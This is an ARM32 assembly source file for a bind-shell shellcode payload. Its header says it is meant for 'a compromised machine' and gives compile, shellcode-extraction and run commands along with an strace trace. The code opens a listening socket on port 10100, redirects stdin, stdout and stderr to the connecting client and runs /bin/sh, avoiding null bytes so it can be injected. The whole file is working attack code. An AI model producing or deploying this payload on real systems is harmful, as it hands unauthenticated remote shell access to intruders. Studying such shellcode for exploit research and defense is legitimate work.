/*

Author: Abhinav Thakur
File:   bind_shell.s

PoE:
	This machine code when executed on a compromised machine, opens up a network process carrying 
	shell such that - whoever connects to this process will receive a shell interface to victim 
	system. Both shell and victim address structure (i.e. NIC_IP_to_listen_on + PORT) are 
	configurable at @shellPath and @hostAddr in this file.

Compile:
	$ arm-linux-gnueabi-gcc -Wl,-N -nostdlib -static bind_shell.s -o ./bind_shell.elf
Dump shellcode :
	$ arm-linux-gnueabi-objcopy --dump-section .text=bind_shell.raw ./bind_shell.elf
Run            :
	$ ./bind_shell.elf

~~ SYSCALL conventions for ARM32
move parameters into => r0, r1, r2, r3, r4, r5
move syscall number  => r7
find return value in => r0

socket(2) - create a socket
bind(2)   - bind the socket to an address (IP+PORT pair)
listen(2) - listen for incomming connections
accept(2) - accept any incomming connection & get a client socket FD on which further communication shall happen.
dup2(2)   - redirect current process's communication interfaces (i.e. FDs for stdin,stdout,stderr) to client socket FD so that all communication happens over socket/connection-established.
execve(2) - spawn a shell whose I/O now happens over internet connection/socket.

~~ TRACING SYSCALLS
$ strace -X raw -e socket,bind,setsockopt,listen,accept,dup2,execve qemu-arm-static -L /usr/arm-linux-gnueabi ./bind_shell.elf
socket(0x2, 0x1, 0)                     = 3
bind(3, {sa_family=0x2, sin_port="\x27\x74", sin_addr="\x00\x00\x00\x00"}, 16) = 0
bind succeeds
listen(3, 7)                            = 0
accept4(3, NULL, NULL, 0)               = 4
dup2(4, 0)                              = 0
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
execve("/bin/sh", [], 0x2140080) = 0

*/

.global _start
_start:

	.code 32
	add r3, pc, #1
	bx r3

	.code 16
	// socket (2, 1, 0);	=> syscall number = 281
	mov r7, #240
	add r7, r7, #41			// r7 = 281
	mov r0, #2				// Protocol family (Internet Socket) - PF_INET (2)
	mov r1, #1				// Socket type (Stream Socket) - SOCK_STREAM (1)
	eor r2, r2, r2			// options - 0
	svc #1

	mov r4, r0				// save socket file descriptor

	// bind (r0, {0x2, "\x27\x74", "\x00\x00\x00\x00"}, 16);
	mov r7, #240
	add r7, #42				// r7 = 282
	adr r1, hostAddr		// r1 = &hostAddr (calculation is done using PC-relative addressing)
	eor r3, r3, r3
	strb r3, [r1, #1]		// fixup address structure members to store NULL byte values at runtime
	str r3, [r1, #4]
	mov r2, #16
	svc #1

	// listen (r0, 7);
	mov r7, #240
	add r7, #44				// r7 = 284
	mov r0, r4
	mov r1, #7				// BACKLOG queue (max number of connections allowed in queue)
	svc #1

	// accept (3, 0, 0)
	mov r7, #240
	add r7, #45				// r7 = 285
	mov r0, #3
	eor r1, r1, r1
	eor r2, r2, r2
	svc #1

	mov r5, r0				// save new client FD (on which further communcation happens)

	// dup2 (sfd, 0) => dup2(sfd, 1) => dup2(sfd, 2)
	mov r7, #63				// syscall number = 63
	eor r1, r1, r1			// r1 = 0
again:
	mov r0, r5
	svc #1
	add r1, r1, #1
	cmp r1, #2
	ble again 

	// execve
	mov r7, #11
	eor r1, r1, r1
	eor r2, r2, r2
	adr r0, shellPath
	strb r2, [r0, #7]
	svc #1

	// exit(7)
	mov r7, #1
	svc #1

.align 2					// ensures that PC-relative addressing assembles fine to hostAddr

// Port number and IP address stored in network byte order (i.e. BIG endian byte order)
hostAddr:
.ascii "\x02\xff"			// Address family - AF_INET
.ascii "\x27\x74"			// Port - 0x2774 = 10100
.byte 0xde,0xad,0xbe,0xef	// IP address = placeholder for 0.0.0.0 (INADDR_ANY)
shellPath:
.ascii "/bin/shX"

